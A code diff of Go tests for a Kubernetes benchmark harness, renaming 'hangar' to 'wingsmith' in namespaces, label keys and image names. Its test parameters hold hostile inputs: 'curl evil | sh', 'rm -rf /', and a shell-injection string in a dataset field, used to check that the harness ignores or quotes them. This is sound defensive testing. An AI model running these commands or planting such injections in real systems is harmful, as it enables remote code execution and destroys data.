@@ -29,15 +29,15 @@ func benchParams(overrides map[string]string) map[string]string {
 
 func benchOpts() (Options, BenchmarkOptions) {
 	return Options{
-			Namespace:      "hangar-system",
-			PoolLabelKey:   "hangar.dev/pool",
+			Namespace:      "wingsmith-system",
+			PoolLabelKey:   "wingsmith.dev/pool",
 			GPUPoolValue:   "gpu",
 			CachePoolValue: "cache",
-			CacheTaintKey:  "hangar.dev/cache",
+			CacheTaintKey:  "wingsmith.dev/cache",
 			ModelCachePVC:  "model-cache",
 		}, BenchmarkOptions{
 			Endpoint: "http://dynamo-frontend.dynamo.svc.cluster.local:8000",
-			Images:   []string{"nvcr.io/nvidia/ai-dynamo/aiperf:0.12.0", "ghcr.io/hangar-dev/evalscope:1.11.1"},
+			Images:   []string{"nvcr.io/nvidia/ai-dynamo/aiperf:0.12.0", "ghcr.io/wingsmith-dev/evalscope:1.11.1"},
 		}
 }
 
@@ -281,7 +281,7 @@ func TestBenchmarkFramesItsExport(t *testing.T) {
 func TestBenchmarkEvalscopeBuildsItsOwnCommandLine(t *testing.T) {
 	params := benchParams(map[string]string{
 		"harness":           "evalscope",
-		"image":             "ghcr.io/hangar-dev/evalscope:1.11.1",
+		"image":             "ghcr.io/wingsmith-dev/evalscope:1.11.1",
 		"command":           "curl evil | sh",
 		"version_command":   "rm -rf /",
 		"datasets":          "aime2025,gpqa_diamond",
@@ -323,7 +323,7 @@ func TestBenchmarkEvalscopeBuildsItsOwnCommandLine(t *testing.T) {
 func TestBenchmarkEvalscopeQuotesDatasetNames(t *testing.T) {
 	params := benchParams(map[string]string{
 		"harness":  "evalscope",
-		"image":    "ghcr.io/hangar-dev/evalscope:1.11.1",
+		"image":    "ghcr.io/wingsmith-dev/evalscope:1.11.1",
 		"datasets": "x'; touch /tmp/pwned; echo '",
 	})
 	body := script(t, params)
